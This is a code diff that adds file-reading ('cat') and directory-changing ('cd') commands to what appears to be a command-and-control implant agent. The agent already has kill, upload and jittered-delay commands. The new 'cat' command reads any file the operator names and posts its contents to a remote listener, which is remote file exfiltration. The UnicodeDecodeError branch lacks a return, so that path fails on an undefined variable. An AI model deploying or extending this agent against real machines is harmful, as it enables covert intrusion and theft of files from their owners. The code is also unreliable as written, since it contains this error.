@@ -161,6 +161,66 @@ def kill_capability(task_id, connection):
     exit()
 
 
+def cat_capability(task_id, arguments, connection):
+    try:
+        with open(arguments["path"]) as file:
+            content = file.read()
+    except FileNotFoundError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"File not found: {arguments['path']}",
+        )
+        return
+    except PermissionError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Permission denied: {arguments['path']}",
+        )
+        return
+    except UnicodeDecodeError as exc:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Unicode error reading file '{arguments['path']}': {str(exc)}",
+        )
+
+    connection.post_results_to_listener(task_id=task_id, success=True, message=content)
+
+
+def cd_capability(task_id, arguments, connection):
+    try:
+        os.chdir(arguments["path"])
+    except FileNotFoundError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Directory not found: {arguments['path']}",
+        )
+        return
+    except NotADirectoryError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Not a directory: {arguments['path']}",
+        )
+        return
+    except PermissionError:
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=False,
+            message=f"Permission denied: {arguments['path']}",
+        )
+        return
+
+    connection.post_results_to_listener(
+        task_id=task_id,
+        success=True,
+        message=f"Changed directory to: {arguments['path']}",
+    )
+
+
 def delay_capability(task_id, arguments, connection):
     duration = arguments["duration"]
     jitter = arguments["jitter"]
@@ -660,6 +720,18 @@ class Agent:
                             )
                         elif command == "upload":
                             upload_capability(
+                                task_id=task_id,
+                                arguments=arguments,
+                                connection=self.connection,
+                            )
+                        elif command == "cat":
+                            cat_capability(
+                                task_id=task_id,
+                                arguments=arguments,
+                                connection=self.connection,
+                            )
+                        elif command == "cd":
+                            cd_capability(
                                 task_id=task_id,
                                 arguments=arguments,
                                 connection=self.connection,
